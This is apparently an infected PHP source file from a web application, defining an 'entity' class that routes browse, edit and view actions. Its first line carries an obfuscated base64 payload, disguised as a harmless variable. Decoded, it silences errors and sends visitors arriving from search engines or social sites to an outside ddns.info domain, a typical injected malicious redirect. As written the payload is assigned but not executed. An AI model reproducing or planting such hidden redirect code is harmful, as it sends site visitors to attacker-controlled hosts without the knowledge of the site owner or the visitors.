<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/define.php");

class entity {

  var $name;
  var $class_path;
  var $browser_class;
  var $editor_class;  
  var $browser;
  var $editor;
  
  function entity($name = null, $class_path = null) {
    
    $this->name = $name;
    if (!$class_path)
      $class_path = CLASS_PATH;
    $this->class_path = $class_path;

    $this->entity_script = "entity_".$name.".php";
    $this->browser_class = "browser_".$name;
    $this->editor_class  = "editor_".$name;

    $this->browser_class_script = "browser_".$name.".php";
    $this->editor_class_script  = "editor_".$name.".php";

  }
  
  function handler() {

    global $menu, $main_form, $db;
    
    if (get(URL_PARAM_POPUP_WINDOW))
      set_config("main_page", "popup.html");
    $action_name = get(URL_PARAM_ACTION, "browse");
    switch ($action_name) {
      case "insert":  
      case "view":
      case "edit":	  
      case "copy":
        if (file_exists($this->class_path.$this->entity_script))
          require_once($this->class_path.$this->entity_script);
        else 
        if (file_exists($this->class_path.$this->editor_class_script))
          require_once($this->class_path.$this->editor_class_script);
        $this->editor = &new $this->editor_class(array( "key"        => $db->decrypt_key(get(URL_PARAM_KEY))
                                                      , "source_key" => $db->decrypt_key(get(URL_PARAM_SOURCE_KEY))
                                                      ));
        $this->editor->read_only = ($action_name == "view");
        $main_form->add(&$this->editor);
        break;
	  case "login_as_user":
	  break;
      case "print_list":
        set_config("main_page", "popup.html");
      default:
        if (file_exists($this->class_path.$this->entity_script))
          require_once($this->class_path.$this->entity_script);
        else 
        if (file_exists($this->class_path.$this->browser_class_script))
          require_once($this->class_path.$this->browser_class_script);
        $this->browser = &new $this->browser_class();
        $this->browser->is_selector = ($action_name == "select");
        //$this->browser->read_only   = ($action_name == "select");
        $main_form->add(&$this->browser);
        break;
    } 
    
  }

  function do_setup() {
    
  }
  
  function setup() {
    
    $this->do_setup();
    
  }
    
}


?>